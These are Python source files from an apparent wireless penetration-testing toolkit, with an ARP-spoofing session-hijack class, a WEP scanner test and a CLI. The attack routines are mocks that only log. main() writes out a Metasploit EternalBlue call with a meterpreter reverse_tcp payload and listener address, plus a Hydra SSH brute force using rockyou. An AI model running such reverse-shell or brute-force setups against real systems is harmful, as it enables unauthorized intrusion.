        self.logger.debug("Loading module 'payload_delivery' from './payload_delivery.py'.")
        self.logger.error("Failed to load module 'payload_delivery': attempted relative import with no known parent package")
        self.logger.error("Failed to load module 'payload_delivery': attempted relative import with no known parent package")
        self.logger.debug("Loading module 'session_hijacking' from './session_hijacking.py'.")
        self.logger.info("Protocol modules loaded successfully.")
        self.logger.info("Protocol modules loaded successfully.")
        self.logger.info("CoreFramework initialized successfully.")
        self.logger.info("CoreFramework initialized successfully.")


# SessionHijacking Class

class SessionHijacking(BaseExploit):
    """
    A class to perform session hijacking via ARP spoofing with advanced automation features.
    This mock does not perform real network operations.
    """

    def __init__(self, core_framework, vulnerability, max_packets: int = 100, interval: float = 2.0,
                 capture_file: str = "capture.pcap", filter_expression: str = None, real_time: bool = False):
        """
        Initialize the SessionHijacking exploit.

        Args:
            core_framework: The core framework instance.
            vulnerability (dict): Information about the vulnerability, including target and gateway IPs.
            max_packets (int): Maximum number of spoofed ARP packets to send.
            interval (float): Time interval between sending ARP spoofing packets in seconds.
            capture_file (str): File path to save captured packets.
            filter_expression (str): BPF filter expression for packet capturing.
            real_time (bool): Whether to process packets in real-time.
        """
        super().__init__(core_framework, vulnerability)
        self.max_packets = max_packets
        self.interval = interval
        self.capture_file = capture_file
        self.filter_expression = filter_expression or f"host {self.vulnerability.get('target_ip')} and host {self.vulnerability.get('gateway_ip')}"
        self.real_time = real_time
        self.analysis_results = []
        self.stop_event = multiprocessing.Event()
        self.processes = []
        self.logger = logging.getLogger(self.__class__.__name__)

        # Extract necessary information from vulnerability dict
        self.target_ip = self.vulnerability.get('target_ip')
        self.gateway_ip = self.vulnerability.get('gateway_ip')
        self.interface = self.core.packet_handler.packet_injector.interface

        if not self.target_ip or not self.gateway_ip:
            self.logger.error("Both target_ip and gateway_ip must be specified in vulnerability info.")
            raise ValueError("Missing target_ip or gateway_ip in vulnerability info.")

        self.target_mac = None
        self.gateway_mac = None

        # Initialize multiprocessing manager for shared data
        self.manager = multiprocessing.Manager()
        self.analysis_results = self.manager.list()

    def execute(self):
        """
        Execute the session hijacking exploit and start monitoring.

        Returns:
            dict: Status of the exploit execution with detected vulnerabilities.
        """
        self.logger.info(f"Starting Session Hijacking on target IP: {self.target_ip}")
        try:
            # Ensure the interface is in monitor mode (mocked)
            self._ensure_monitor_mode()

            # Resolve MAC addresses (mocked)
            self.target_mac = "AA:BB:CC:DD:EE:FF"
            self.gateway_mac = "11:22:33:44:55:66"

            if not self.target_mac:
                self.logger.error(f"Could not resolve MAC address for target IP: {self.target_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for target IP: {self.target_ip}"}

            if not self.gateway_mac:
                self.logger.error(f"Could not resolve MAC address for gateway IP: {self.gateway_ip}")
                return {"status": "error", "message": f"Could not resolve MAC address for gateway IP: {self.gateway_ip}"}

            self.logger.debug(f"Target MAC: {self.target_mac}, Gateway MAC: {self.gateway_mac}")

            # Start ARP spoofing process (mock)
            arp_process = multiprocessing.Process(target=self._arp_spoof, daemon=True)
            arp_process.start()
            self.processes.append(arp_process)
            self.logger.debug(f"ARP spoofing process started with PID: {arp_process.pid}")

            if self.real_time:
                # Start real-time packet processing process (mock)
                real_time_process = multiprocessing.Process(target=self._real_time_packet_processing, daemon=True)
                real_time_process.start()
                self.processes.append(real_time_process)
                self.logger.debug(f"Real-time packet processing started with PID: {real_time_process.pid}")
            else:
                # Start tcpdump monitoring process (mock)
                monitor_process = multiprocessing.Process(target=self._start_monitoring, daemon=True)
                monitor_process.start()
                self.processes.append(monitor_process)
                self.logger.debug(f"tcpdump monitoring process started with PID: {monitor_process.pid}")

            # Start process monitoring thread (mocked as separate process)
            monitor_thread = multiprocessing.Process(target=self._monitor_processes, daemon=True)
            monitor_thread.start()
            self.processes.append(monitor_thread)

            self.logger.info("Session Hijacking exploit and monitoring initiated.")
            return {"status": "success"}

        except Exception as e:
            self.logger.exception(f"Failed to execute Session Hijacking exploit: {e}")
            self.cleanup()
            return {"status": "error", "message": str(e)}

    def _ensure_monitor_mode(self):
        """
        Mock method to ensure the interface is in monitor mode.
        """
        self.logger.info(f"Mock: Ensuring interface {self.interface} is in monitor mode.")
        # Simulate mode check
        mode = self.core.packet_handler.packet_injector.get_interface_mode()
        if mode != 'monitor':
            self.logger.info(f"Mock: Setting interface {self.interface} to monitor mode.")
            # Simulate setting to monitor mode
            # In real implementation, use tools like airmon-ng
            self.logger.info(f"Mock: Interface {self.interface} set to monitor mode.")
        else:
            self.logger.debug(f"Mock: Interface {self.interface} is already in monitor mode.")

    def _arp_spoof(self):
        """
        Mock ARP spoofing function.
        """
        self.logger.info("Mock: Starting ARP spoofing.")
        try:
            for count in range(self.max_packets):
                if self.stop_event.is_set():
                    break
                # Mock sending ARP packets
                self.logger.debug(f"Mock: Sent spoofed ARP packet {count+1}/{self.max_packets}")
                time.sleep(self.interval)
        except Exception as e:
            self.logger.exception(f"Mock: Error during ARP spoofing: {e}")
            self.stop_event.set()

    def _real_time_packet_processing(self):
        """
        Mock real-time packet processing function.
        """
        self.logger.info("Mock: Starting real-time packet processing with Scapy.")
        try:
            for _ in range(self.max_packets):
                if self.stop_event.is_set():
                    break
                # Mock packet processing
                fake_packet = {"summary": "Mock Packet"}
                self._process_packet(fake_packet)
                time.sleep(self.interval)
        except Exception as e:
            self.logger.exception(f"Mock: Real-time packet processing failed: {e}")
            self.stop_event.set()

    def _process_packet(self, packet):
        """
        Mock packet processing callback.
        """
        self.logger.debug(f"Mock: Processing packet: {packet.get('summary', 'No Summary')}")
        # Simulate detecting an HTTP GET request
        fake_url = "http://example.com/test"
        self.logger.info(f"Mock: Detected HTTP GET request for URL: {fake_url}")
        self.analysis_results.append({'type': 'HTTP_GET', 'url': fake_url})

    def _start_monitoring(self):
        """
        Mock packet capturing process using tcpdump.
        """
        self.logger.info("Mock: Starting network traffic monitoring with tcpdump.")
        try:
            for count in range(self.max_packets):
                if self.stop_event.is_set():
                    break
                # Mock capturing packets
                self.logger.debug(f"Mock: Captured packet {count+1}/{self.max_packets}")
                time.sleep(self.interval)
        except Exception as e:
            self.logger.exception(f"Mock: Failed to start network monitoring: {e}")
            self.stop_event.set()

    def _monitor_processes(self):
        """
        Mock process monitoring function.
        """
        self.logger.info("Mock: Starting to monitor child processes.")
        try:
            while not self.stop_event.is_set():
                time.sleep(1)
        except Exception as e:
            self.logger.exception(f"Mock: Error in process monitoring: {e}")
            self.stop_event.set()
            self.cleanup()

    def cleanup(self):
        """
        Mock cleanup function.
        """
        self.logger.info("Mock: Cleaning up Session Hijacking exploit.")

        # Signal all processes to stop
        self.stop_event.set()

        # Terminate all child processes (mock)
        for process in self.processes:
            if process.is_alive():
                process.terminate()
                process.join(timeout=1)
                if process.is_alive():
                    self.logger.warning(f"Mock: Process PID {process.pid} did not terminate gracefully. Killing it.")
                    process.kill()
                    process.join()
                self.logger.debug(f"Mock: Process PID {process.pid} has been terminated.")

        # Restore ARP tables (mock)
        if not self.real_time:
            self._restore_arp()

        # Reset interface to managed mode (mock)
        self._reset_interface()

        # Generate report (mock)
        self.generate_report()

        self.logger.info("Mock: Session Hijacking exploit and monitoring stopped.")

    def _restore_arp(self):
        """
        Mock restore ARP tables function.
        """
        self.logger.info("Mock: Restoring ARP tables.")
        try:
            # Mock restoring ARP
            self.logger.info("Mock: ARP tables restored successfully.")
        except Exception as e:
            self.logger.exception(f"Mock: Failed to restore ARP tables: {e}")

    def _reset_interface(self):
        """
        Mock reset interface function.
        """
        self.logger.info(f"Mock: Setting interface {self.interface} back to managed mode.")
        try:
            # Mock resetting interface
            self.logger.info(f"Mock: Interface {self.interface} set back to managed mode.")
        except Exception as e:
            self.logger.exception(f"Mock: Unexpected error while resetting interface: {e}")

    def generate_report(self, report_file: str = "session_hijack_report.json"):
        """
        Generates a comprehensive JSON report of the findings.
        """
        self.logger.info(f"Generating report: {report_file}")
        try:
            report_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerability_info': self.vulnerability,
                'analysis_results': list(self.analysis_results),
                'interface': self.interface,
                'capture_file': self.capture_file if not self.real_time else "Real-time processing enabled",
            }

            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=4)

            self.logger.info(f"Report generated successfully at {report_file}")
        except Exception as e:
            self.logger.exception(f"Failed to generate report: {e}")

    def generate_html_report(self, template_file: str = "report_template.html", report_file: str = "session_hijack_report.html"):
        """
        Generates a comprehensive HTML report of the findings using a Jinja2 template.
        """
        self.logger.info(f"Generating HTML report: {report_file}")
        try:
            # Check if the template file exists; if not, create a mock template
            if not os.path.exists(template_file):
                self.logger.debug(f"Template file {template_file} not found. Creating a mock template.")
                mock_template = """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Session Hijacking Report</title>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 20px; }
                        h1 { color: #333; }
                        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
                        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
                        th { background-color: #f2f2f2; }
                    </style>
                </head>
                <body>
                    <h1>Session Hijacking Report</h1>
                    <p><strong>Timestamp:</strong> {{ timestamp }}</p>
                    <p><strong>Interface:</strong> {{ interface }}</p>
                    <p><strong>Vulnerability Information:</strong></p>
                    <ul>
                        <li>Target IP: {{ vulnerability_info.target_ip }}</li>
                        <li>Gateway IP: {{ vulnerability_info.gateway_ip }}</li>
                        <li>Channel: {{ vulnerability_info.channel }}</li>
                    </ul>
                    <p><strong>Capture File:</strong> {{ capture_file }}</p>

                    <h2>Analysis Results</h2>
                    <table>
                        <tr>
                            <th>Type</th>
                            <th>Details</th>
                        </tr>
                        {% for result in analysis_results %}
                        <tr>
                            <td>{{ result.type }}</td>
                            <td>{{ result.url }}</td>
                        </tr>
                        {% endfor %}
                    </table>
                </body>
                </html>
                """
                with open(template_file, 'w') as f:
                    f.write(mock_template)
                self.logger.debug(f"Mock template created at {template_file}.")

            # Setup Jinja2 environment
            env = Environment(loader=FileSystemLoader('.'))
            template = env.get_template(template_file)

            report_data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'vulnerability_info': self.vulnerability,
                'analysis_results': list(self.analysis_results),
                'interface': self.interface,
                'capture_file': self.capture_file if not self.real_time else "Real-time processing enabled",
            }

            # Render the template with data
            report_html = template.render(report_data)

            # Save the report
            with open(report_file, 'w') as f:
                f.write(report_html)

            self.logger.info(f"HTML report generated successfully at {report_file}")
        except Exception as e:
            self.logger.exception(f"Failed to generate HTML report: {e}")

    def perform_network_scan(self, scan_file: str = "nmap_scan.xml"):
        """
        Mock network scan function.
        """
        self.logger.info(f"Starting mock Nmap scan on {self.target_ip}")
        try:
            # Mock Nmap scan results
            fake_scan_results = {
                'host': self.target_ip,
                'ports': [
                    {'port': 22, 'state': 'open', 'service': 'ssh'},
                    {'port': 80, 'state': 'open', 'service': 'http'},
                ]
            }

            with open(scan_file, 'w') as f:
                json.dump(fake_scan_results, f, indent=4)

            self.logger.info(f"Mock Nmap scan completed. Results saved to {scan_file}")
        except Exception as e:
            self.logger.exception(f"Mock: Nmap scan failed: {e}")

    def perform_metasploit_exploit(self, module: str, payload: str, lhost: str, lport: int, output_file: str = "metasploit_output.txt"):
        """
        Mock Metasploit exploit function.
        """
        self.logger.info(f"Starting mock Metasploit exploit using module {module}")
        try:
            # Mock Metasploit exploit results
            fake_metasploit_output = {
                'module': module,
                'payload': payload,
                'status': 'success',
                'sessions': [
                    {'session_id': 1, 'target': self.target_ip, 'host': lhost, 'port': lport}
                ]
            }

            with open(output_file, 'w') as f:
                json.dump(fake_metasploit_output, f, indent=4)

            self.logger.info(f"Mock Metasploit exploit completed. Output saved to {output_file}")
        except Exception as e:
            self.logger.exception(f"Mock: Metasploit exploit failed: {e}")

    def perform_hydra_attack(self, service: str, username: str, password_file: str, target_ip: str, output_file: str = "hydra_output.txt"):
        """
        Mock Hydra attack function.
        """
        self.logger.info(f"Starting mock Hydra attack on {service} service at {target_ip}")
        try:
            # Mock Hydra attack results
            fake_hydra_output = {
                'service': service,
                'username': username,
                'passwords_tried': 1000,
                'successful_passwords': ['password123', 'admin@123']
            }

            with open(output_file, 'w') as f:
                json.dump(fake_hydra_output, f, indent=4)

            self.logger.info(f"Mock Hydra attack completed. Results saved to {output_file}")
        except Exception as e:
            self.logger.exception(f"Mock: Hydra attack failed: {e}")


# Main Function

def main():
    # Configure logging
    logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Define fake vulnerability information
    vulnerability_info = {
        'target_ip': '192.168.1.10',
        'gateway_ip': '192.168.1.1',
        'channel': 6
    }

    # Define custom filter expression (optional)
    custom_filter = "tcp port 80"  # Example: Capture only HTTP traffic

    # Initialize core framework with mock implementation
    core = CoreFramework(modules_path=".", interface='wlan0')

    # Initialize the exploit with fake test data
    exploit = SessionHijacking(
        core_framework=core,
        vulnerability=vulnerability_info,
        max_packets=5,  # Reduced number for testing
        interval=1.0,   # Short interval for testing
        capture_file="session_hijack_capture.pcap",
        filter_expression=custom_filter,
        real_time=True
    )

    # Execute the exploit
    result = exploit.execute()
    print(result)

    if result.get("status") != "success":
        print("Exploit failed to start. Exiting.")
        return

    # Run the exploit and monitoring for a short duration (e.g., 10 seconds for testing)
    try:
        run_duration = 10  # seconds
        start_time = time.time()
        while (time.time() - start_time) < run_duration:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Interrupted by user.")

    # Cleanup after the attack
    exploit.cleanup()

    print("Session Hijacking and monitoring completed.")

    # Perform additional mock actions post-exploit
    exploit.perform_network_scan(scan_file="nmap_scan.xml")
    exploit.perform_metasploit_exploit(
        module="exploit/windows/smb/ms17_010_eternalblue",
        payload="windows/meterpreter/reverse_tcp",
        lhost="192.168.1.100",
        lport=4444,
        output_file="metasploit_eternalblue.txt"
    )
    exploit.perform_hydra_attack(
        service="ssh",
        username="admin",
        password_file="/usr/share/wordlists/rockyou.txt",
        target_ip="192.168.1.10",
        output_file="hydra_ssh.txt"
    )

    # Generate reports
    exploit.generate_report("final_session_hijack_report.json")
    exploit.generate_html_report(template_file="report_template.html", report_file="final_session_hijack_report.html")

    print("Network scan, exploits, and reporting completed.")


if __name__ == "__main__":
    main()


# tests/test_wep_scanner.py
# tests/test_wep_scanner.py

import unittest
from unittest.mock import MagicMock, patch
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
from scanners.wep_scanner import WEPScanner
import threading


class TestWEPScanner(unittest.TestCase):
    def setUp(self):
        # Mock CoreFramework with a mock logger and network_manager
        self.mock_core_framework = MagicMock()
        self.mock_core_framework.logger = MagicMock()
        self.mock_core_framework.network_manager.interface = "wlan0mon"

        # Initialize WEPScanner with mocked CoreFramework
        self.wep_scanner = WEPScanner(core_framework=self.mock_core_framework)
        # Assuming WEPScanner has a scan_duration attribute
        self.wep_scanner.scan_duration = 10

    def test_init(self):
        self.assertEqual(self.wep_scanner.core_framework, self.mock_core_framework)
        self.assertEqual(self.wep_scanner.scan_duration, 10)

    def test_scan_no_wep_networks(self):
        target_info = {"ssid": "TestSSID", "bssid": "00:11:22:33:44:55"}
        stop_event = MagicMock()
        stop_event.is_set.return_value = False

        with patch('scapy.all.sniff') as mock_sniff:
            # Simulate sniff not finding any WEP networks
            mock_sniff.side_effect = lambda iface, prn, timeout, stop_filter: None
            result = self.wep_scanner.scan(target_info, stop_event)
            self.assertIn("wep_networks", result)
            self.assertEqual(result["wep_networks"], {})

    def test_scan_with_wep_networks(self):
        target_info = {"ssid": "TestSSID", "bssid": "00:11:22:33:44:55"}
        stop_event = MagicMock()
        stop_event.is_set.return_value = False

        # Create a fake WEP packet
        pkt = Dot11(addr3="00:11:22:33:44:55") / Dot11Beacon() / Dot11Elt(ID="SSID", info="TestSSID") / Dot11Elt(
            ID="Rates", info="some rates") / Dot11Elt(ID="RSN", info="some rsn info")

        with patch('scapy.all.sniff') as mock_sniff:
            # Simulate sniff calling packet_handler with the fake packet
            def side_effect(*args, **kwargs):
                prn = kwargs.get('prn')
                prn(pkt)

            mock_sniff.side_effect = side_effect
            result = self.wep_scanner.scan(target_info, stop_event)
            self.assertIn("wep_networks", result)
            self.assertIn("00:11:22:33:44:55", result["wep_networks"])
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["SSID"], "TestSSID")
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["BSSID"], "00:11:22:33:44:55")
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["Security"],
                             ['WEP'])  # Assuming 'WEP' is in security
            self.assertEqual(result["wep_networks"]["00:11:22:33:44:55"]["Key_Strength"], "Unknown")

    def test_assess_key_strength(self):
        pkt = Dot11()
        result = self.wep_scanner.assess_key_strength(pkt)
        self.assertEqual(result, "Unknown")  # Based on the current implementation

    def tearDown(self):
        # Clean up after each test if necessary
        pass


if __name__ == '__main__':
    print("Running WEPScanner tests...")
    print(f"{'*' * 40}\n")

    unittest.main()


# tests/__init__.py


# test_network/manage.py
# test_network/manage.py

import subprocess
import argparse
import os
import sys

def run_command(command, cwd):
    try:
        subprocess.run(command, cwd=cwd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Command '{' '.join(command)}' failed with error: {e}")
        sys.exit(1)

def start_network(compose_file):
    print("Starting test network...")
    run_command(['docker-compose', 'up', '-d'], cwd=os.path.dirname(compose_file))
    print("Test network started successfully.")

def stop_network(compose_file):
    print("Stopping test network...")
    run_command(['docker-compose', 'down'], cwd=os.path.dirname(compose_file))
    print("Test network stopped successfully.")

def status_network(compose_file):
    print("Checking test network status...")
    run_command(['docker-compose', 'ps'], cwd=os.path.dirname(compose_file))
    print("Test network status displayed above.")

def main():
    parser = argparse.ArgumentParser(description="Manage the test network environment.")
    parser.add_argument('action', choices=['start', 'stop', 'status'], help="Action to perform on the test network.")
    parser.add_argument('--compose-file', default='docker-compose.yml', help="Path to the docker-compose file.")

    args = parser.parse_args()

    compose_file = args.compose_file

    if not os.path.exists(compose_file):
        print(f"Docker Compose file '{compose_file}' not found.")
        sys.exit(1)

    if args.action == 'start':
        start_network(compose_file)
    elif args.action == 'stop':
        stop_network(compose_file)
    elif args.action == 'status':
        status_network(compose_file)
    else:
        print(f"Unknown action '{args.action}'.")
        sys.exit(1)

if __name__ == '__main__':
    main()


# test_network/__init__.py


# ui/cli.py
# ui/cli.py

import click
import os
import sys
import json
import yaml
import subprocess
import logging
import pandas as pd
from colorama import Fore
from core.config.protocols import register_scanners
from core.config.protocols import register_exploits


# Configure logging within cli.py if necessary or rely on core/__init__.py's logging
# Set up basic logging to capture errors during initialization
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Ensure the project root is in the Python path for absolute imports
current_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_dir, '..'))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

def initialize_coreframework():
    from core import CoreFramework  # Import inside the function to avoid circular imports
    return CoreFramework(
        config_dir=os.path.join('config'), # Correct config_dir
        scanners=register_scanners(),
        exploits=register_exploits(),

    )

@click.group()
@click.version_option(version='1.0.0', prog_name='WirelessPenTestLib')
@click.pass_context
def cli(ctx):
    """
    WirelessPenTestLib: A Comprehensive Wireless Penetration Testing Library
    """
    protocols_path = os.path.join(project_root, 'core', 'config', 'protocols')

    ctx.ensure_object(dict)
    try:
        # Initialize CoreFramework using the separate function
        core = initialize_coreframework()
        core.load_protocol_modules()
        ctx.obj['core'] = core
        core.logger.info("CLI initialized successfully with project root: %s and protocols path: %s", project_root, protocols_path)
    except Exception as e:
        logger.exception("Error initializing CoreFramework")  # Use logger here instead of core.logger
        click.echo(f"Error initializing CoreFramework: {e}")
        ctx.exit(1)


@cli.command()
@click.option('--scanner', '-s', multiple=True, help='Specify scanners to run (e.g., encryption_scanner, auth_bypass_scanner, dos_scanner).')
@click.option('--target-ssid', prompt='Target SSID', help='SSID of the target wireless network.')
@click.option('--target-bssid', prompt='Target BSSID', help='BSSID of the target wireless network.')
@click.pass_context
def scan(ctx, scanner, target_ssid, target_bssid):
    """
    Execute vulnerability scans on the specified target.
    """
    core = ctx.obj['core']
    vulnerability_db = core.vulnerability_db

    # Define the target
    target = {
        'ssid': target_ssid,
        'bssid': target_bssid
    }

    if not scanner:
        click.echo("No scanners specified. Running all available scanners.")
        scanner = list(core.scanners.keys())

    for sc in scanner:
        if sc not in core.scanners:
            click.echo(f"Scanner '{sc}' not found. Available scanners are:")
            for scanner_name in core.scanners.keys():
                click.echo(f"- {scanner_name}")
            continue
        click.echo(f"\nRunning scanner: {sc}")
        try:
            vulnerabilities = core.run_scanner(sc, target)
            # Merge vulnerabilities into the vulnerability_db
            for key, value in vulnerabilities.items():
                if key not in vulnerability_db:
                    vulnerability_db[key] = []
                vulnerability_db[key].extend(value)
        except Exception as e:
            core.logger.exception(f"Error running scanner '{sc}'")
            click.echo(f"Error running scanner '{sc}': {e}")
            continue  # Skip failed scanner and proceed with the next one
    click.echo("\nAll specified scans have been executed.")

@cli.command()
@click.option('--exploit', '-e', multiple=True, help='Specify exploits to run (e.g., session_hijacking, credential_extraction, payload_delivery).')
@click.option('--target-ssid', prompt='Target SSID', help='SSID of the target wireless network.')
@click.option('--target-bssid', prompt='Target BSSID', help='BSSID of the target wireless network.')
@click.pass_context
def exploit(ctx, exploit, target_ssid, target_bssid):
    """
    Run exploitation modules on identified vulnerabilities.
    """
    core = ctx.obj['core']
    vulnerability_db = core.vulnerability_db

    # Define the target
    target = {
        'ssid': target_ssid,
        'bssid': target_bssid
    }

    if not exploit:
        click.echo("No exploits specified. Available exploits are:")
        for ex in core.exploits.keys():
            click.echo(f"- {ex}")
        ctx.exit(1)

    for ex in exploit:
        if ex not in core.exploits:
            click.echo(f"Exploit '{ex}' not found. Available exploits are:")
            for exploit_name in core.exploits.keys():
                click.echo(f"- {exploit_name}")
            continue

        # Prepare vulnerability information based on exploit type
        vuln_info = {}
        if ex == 'session_hijacking':
            click.echo("\n--- Session Hijacking Configuration ---")
            vuln_info['target_session'] = {
                'target_ip': click.prompt('Target IP', type=str),
                'target_mac': click.prompt('Target MAC Address', type=str),
                'gateway_ip': click.prompt('Gateway IP', type=str),
                'gateway_mac': click.prompt('Gateway MAC Address', type=str)
            }
        elif ex == 'payload_delivery':
            click.echo("\n--- Payload Delivery Configuration ---")
            vuln_info['payload_type'] = click.prompt('Payload Type', type=click.Choice(['reverse_shell', 'malicious_script']))
            vuln_info['duration'] = click.prompt('Exploit Duration (seconds)', default=10, type=int)

        # Run the exploit
        click.echo(f"\nRunning exploit: {ex}")
        try:
            vulnerabilities = core.run_exploit(ex, vuln_info)
            # Merge vulnerabilities into the vulnerability_db
            for key, value in vulnerabilities.items():
                if key not in vulnerability_db:
                    vulnerability_db[key] = []
                vulnerability_db[key].extend(value)
        except Exception as e:
            core.logger.exception(f"Error running exploit '{ex}'")
            click.echo(f"Error running exploit '{ex}': {e}")
            ctx.exit(1)
    click.echo("\nAll specified exploits have been executed.")

@cli.command()
@click.option('--set', 'settings', nargs=2, multiple=True, help='Set configuration settings (e.g., general.interface wlan0mon).')
@click.pass_context
def configure(ctx, settings):
    """
    Configure settings and preferences.
    """
    core = ctx.obj['core']
    if not settings:
        click.echo("Current Configuration:")
        config_path = os.path.join(str(core.config_manager.config_dir), 'config.yaml')
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = yaml.safe_load(f)
                for section, values in config.items():
                    click.echo(f"\n[{section}]")
                    for key, value in values.items():
                        click.echo(f"{key}: {value}")
            except Exception as e:
                core.logger.exception("Error reading configuration")
                click.echo(f"Error reading configuration: {e}")
                ctx.exit(1)
        else:
            click.echo("No configuration found.")
        return

    for key, value in settings:
        try:
            core.config_manager.set_config(key, value)
            click.echo(f"Set '{key}' to '{value}'.")
        except ValueError as ve:
            core.logger.exception(f"Error setting '{key}'")
            click.echo(f"Error setting '{key}': {ve}")
            continue

    click.echo("\nConfiguration updated successfully.")

@cli.command()
@click.option('--format', '-f', type=click.Choice(['json', 'txt']), default='txt', help='Format of the report.')
@click.pass_context
def report(ctx, format):
    """
    View and export scan and exploit reports.
    """
    core = ctx.obj['core']
    click.echo("Generating report...")

    report_data = {
        'scans': {},
        'exploits': {}
    }

    # Categorize scan and exploit data
    for scan_type, vulnerabilities in core.vulnerability_db.items():
        if scan_type.startswith('scan'):
            report_data['scans'][scan_type] = vulnerabilities
        elif scan_type.startswith('exploit'):
            report_data['exploits'][scan_type] = vulnerabilities

    if format == 'json':
        report_path = os.path.normpath(os.path.join(str(core.config_manager.general.report_directory), 'json', 'report.json'))
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        try:
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=4)
            click.echo(f"JSON report exported to {report_path}")
        except Exception as e:
            core.logger.exception("Error exporting JSON report")
            click.echo(f"Error exporting JSON report: {e}")
    else:
        report_path = os.path.normpath(os.path.join(str(core.config_manager.general.report_directory), 'txt', 'report.txt'))
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        try:
            with open(report_path, 'w') as f:
                for scan_type, vulnerabilities in report_data['scans'].items():
                    f.write(f"Scanner: {scan_type}{os.linesep}")
                    for vuln in vulnerabilities:
                        f.write(f"  - SSID: {vuln.get('ssid', 'N/A')}{os.linesep}")
                        f.write(f"    BSSID: {vuln.get('bssid', 'N/A')}{os.linesep}")
                        f.write(f"    Protocol: {vuln.get('protocol', 'N/A')}{os.linesep}")
                        f.write(f"    Description: {vuln.get('description', 'N/A')}{os.linesep}")
                for exploit_type, vulnerabilities in report_data['exploits'].items():
                    f.write(f"Exploit: {exploit_type}{os.linesep}")
                    for vuln in vulnerabilities:
                        f.write(f"  - BSSID: {vuln.get('bssid', 'N/A')}{os.linesep}")
                        f.write(f"    Description: {vuln.get('description', 'N/A')}{os.linesep}")
                        f.write(f"    Action: {vuln.get('action', 'N/A')}{os.linesep}")
            click.echo(f"TXT report exported to {report_path}")
        except Exception as e:
            core.logger.exception("Error exporting TXT report")
            click.echo(f"Error exporting TXT report: {e}")

@cli.command()
@click.pass_context
def list(ctx):
    """
    List available scanners and exploits.
    """
    core = ctx.obj['core']
    click.echo("\nAvailable Scanners:")
    for sc in core.scanners.keys():
        click.echo(f"- {sc}")

    click.echo("\nAvailable Exploits:")
    for ex in core.exploits.keys():
        click.echo(f"- {ex}")


# Before
@cli.command()
@click.option('--action', type=click.Choice(['start', 'stop', 'status', 'help']), required=True, help="Action to perform on the test network.")
@click.pass_context
def test_network(ctx, action):
    """
    Manage the test network environment.
    """
    core = ctx.obj['core']
    compose_file = os.path.join(project_root, 'test_network', 'docker-compose.yml')
    manage_script = os.path.join(project_root, 'test_network', 'manage.py')

    if not os.path.exists(compose_file):
        click.echo(f"Docker Compose file '{compose_file}' not found.")
        ctx.exit(1)

    if action == 'help':
        click.echo("Usage: test_network [OPTIONS] ACTION")
        click.echo("Actions:")
        click.echo("  start     Start the test network.")
        click.echo("  stop      Stop the test network.")
        click.echo("  status    Check the status of the test network.")
        ctx.exit(0)

    try:
        subprocess.run([sys.executable, manage_script, action, '--compose-file', compose_file], check=True)
    except subprocess.CalledProcessError as e:
        core.logger.error(f"Error running manage.py script: {e}")
        click.echo(f"Error running manage.py script: {e}")
        ctx.exit(1)

    click.echo(f"Test network {action}ed successfully.")


# local network scan
@cli.command()
@click.pass_context
def local_scan(ctx):
    """
    Perform a local network scan using LocalScanner.
    """
    import click  # Ensure click is available
    core = ctx.obj.get('core')
    if not core:
        logger.error("Core framework is not initialized.")
        click.echo("Error: Core framework is not initialized.")
        ctx.exit(1)

    # Access the LocalScanner class; ensure 'local_network' is registered correctly
    try:
        local_scanner_class = core.scanners['local']  # Ensure this key is correct
    except KeyError:
        logger.error("LocalScanner ('local_network') is not registered in core.scanners.")
        click.echo("Error: LocalScanner ('local_network') is not registered. Please check your scanner registrations.")
        ctx.exit(1)

    # List available interfaces using the LocalScanner's static method
    try:
        available_interfaces = local_scanner_class.list_interfaces()
    except Exception as e:
        logger.exception("Failed to list network interfaces.")
        click.echo(f"Error: Failed to list network interfaces. Details: {e}")
        ctx.exit(1)

    if not available_interfaces:
        logger.info("No network interfaces found.")
        click.echo("No network interfaces found.")
        return

    # Create a DataFrame for available interfaces
    interfaces_df = pd.DataFrame({
        'Index': range(1, len(available_interfaces) + 1),
        'Interface Name': available_interfaces
    })

    click.echo(Fore.CYAN + "\nAvailable Network Interfaces:")
    click.echo(interfaces_df.to_string(index=False))

    # Prompt the user to select an interface using click's prompt
    try:
        selected_idx = click.prompt(
            f"\nSelect an interface [1-{len(available_interfaces)}]",
            type=click.IntRange(1, len(available_interfaces))
        )
        selected_interface = available_interfaces[selected_idx - 1]
    except click.exceptions.BadParameter as e:
        logger.error(f"Invalid selection: {e}")
        click.echo("Invalid selection. Please enter a valid number corresponding to the listed interfaces.")
        return

    # Initialize the LocalScanner with the selected interface
    try:
        scanner = local_scanner_class(selected_interface)
    except Exception as e:
        logger.exception(f"Failed to initialize LocalScanner with interface '{selected_interface}'.")
        click.echo(f"Error: Failed to initialize scanner. Details: {e}")
        return

    # Attempt to set monitor mode
    try:
        scanner.set_monitor_mode()
    except Exception as e:
        logger.error(f"Failed to set monitor mode on interface '{selected_interface}': {e}")
        click.echo(f"Error: Failed to set monitor mode on interface '{selected_interface}'. Details: {e}")
        # Decide whether to exit or continue; here we continue to show details
        # ctx.exit(1)

    # Retrieve and display interface details
    try:
        details = scanner.get_interface_details()
    except Exception as e:
        logger.error(f"Failed to retrieve interface details for '{selected_interface}': {e}")
        click.echo(f"Error: Failed to retrieve interface details for '{selected_interface}'. Details: {e}")
        return

    if not details:
        logger.info(f"No details found for interface '{selected_interface}'.")
